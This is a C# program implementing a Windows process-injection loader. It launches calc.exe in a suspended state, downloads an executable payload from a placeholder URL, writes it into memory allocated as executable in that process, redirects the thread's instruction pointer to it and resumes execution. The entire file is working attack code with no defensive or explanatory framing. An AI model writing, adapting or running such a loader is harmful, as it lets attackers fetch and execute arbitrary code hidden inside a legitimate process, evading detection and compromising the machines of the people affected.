using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

class Program
{
    // Constants
    private const uint CREATE_SUSPENDED = 0x00000004;
    private const uint CONTEXT_FULL = 0x10000B;
    private const uint MEM_COMMIT = 0x1000;
    private const uint MEM_RESERVE = 0x2000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    [StructLayout(LayoutKind.Sequential)]
    public struct SECURITY_ATTRIBUTES
    {
        public uint nLength;
        public IntPtr lpSecurityDescriptor;
        public bool bInheritHandle;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CONTEXT64
    {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip;
    }

    // P/Invoke
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern bool CreateProcess(
        string lpApplicationName,
        string lpCommandLine,
        IntPtr lpProcessAttributes,
        IntPtr lpThreadAttributes,
        bool bInheritHandles,
        uint dwCreationFlags,
        IntPtr lpEnvironment,
        string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo,
        out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        IntPtr lpBuffer,
        uint nSize,
        out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(
        IntPtr hProcess,
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(
        IntPtr hProcess,
        IntPtr lpBaseAddress,
        byte[] lpBuffer,
        uint nSize,
        out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    static async Task Main(string[] args)
    {
        string payloadUrl = "http://example.com/payload.exe"; // Replace with user input
        string targetExe = @"C:\WINDOWS\System32\calc.exe";

        try
        {
            // Step 1: Create the target process in a suspended state
            var processInfo = CreateSuspendedProcess(targetExe);

            // Step 2: Download the payload asynchronously
            byte[] payloadData = await DownloadPayloadAsync(payloadUrl);

            // Step 3: Inject payload into the target process
            InjectPayload(processInfo, payloadData);

            Console.WriteLine("Injection complete.");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Error: {ex.Message}");
        }
    }

    private static PROCESS_INFORMATION CreateSuspendedProcess(string targetExe)
    {
        Console.WriteLine($"Starting {targetExe} in suspended state...");

        STARTUPINFO startupInfo = new STARTUPINFO();
        PROCESS_INFORMATION processInfo;

        if (!CreateProcess(
            null,
            targetExe,
            IntPtr.Zero,
            IntPtr.Zero,
            false,
            CREATE_SUSPENDED,
            IntPtr.Zero,
            null,
            ref startupInfo,
            out processInfo))
        {
            throw new InvalidOperationException($"Error creating process: {Marshal.GetLastWin32Error()}");
        }

        return processInfo;
    }

    private static async Task<byte[]> DownloadPayloadAsync(string payloadUrl)
    {
        try
        {
            Console.WriteLine("Downloading payload...");
            using (HttpClient client = new HttpClient())
            {
                return await client.GetByteArrayAsync(payloadUrl);
            }
        }
        catch (Exception ex)
        {
            throw new InvalidOperationException($"Error downloading payload: {ex.Message}");
        }
    }

    private static void InjectPayload(PROCESS_INFORMATION processInfo, byte[] payloadData)
    {
        CONTEXT64 context = new CONTEXT64 { ContextFlags = CONTEXT_FULL };
        if (!GetThreadContext(processInfo.hThread, ref context))
        {
            throw new InvalidOperationException($"Error getting thread context: {Marshal.GetLastWin32Error()}");
        }

        // Step 1: Allocate memory in the target process
        IntPtr allocatedMemory = VirtualAllocEx(
            processInfo.hProcess,
            IntPtr.Zero,
            (uint)payloadData.Length,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (allocatedMemory == IntPtr.Zero)
        {
            throw new InvalidOperationException($"Error allocating memory: {Marshal.GetLastWin32Error()}");
        }

        Console.WriteLine($"Memory allocated at {allocatedMemory}");

        // Step 2: Write payload to the allocated memory
        IntPtr bytesWritten;
        if (!WriteProcessMemory(processInfo.hProcess, allocatedMemory, payloadData, (uint)payloadData.Length, out bytesWritten))
        {
            throw new InvalidOperationException($"Error writing payload: {Marshal.GetLastWin32Error()}");
        }

        // Step 3: Update the context with the new entrypoint (the allocated memory address)
        context.Rip = (ulong)allocatedMemory;
        if (!SetThreadContext(processInfo.hThread, ref context))
        {
            throw new InvalidOperationException($"Error setting thread context: {Marshal.GetLastWin32Error()}");
        }

        // Step 4: Resume the thread to start execution
        if (ResumeThread(processInfo.hThread) == 0)
        {
            throw new InvalidOperationException($"Error resuming thread: {Marshal.GetLastWin32Error()}");
        }

        Console.WriteLine("Payload injected and process resumed.");
    }
}
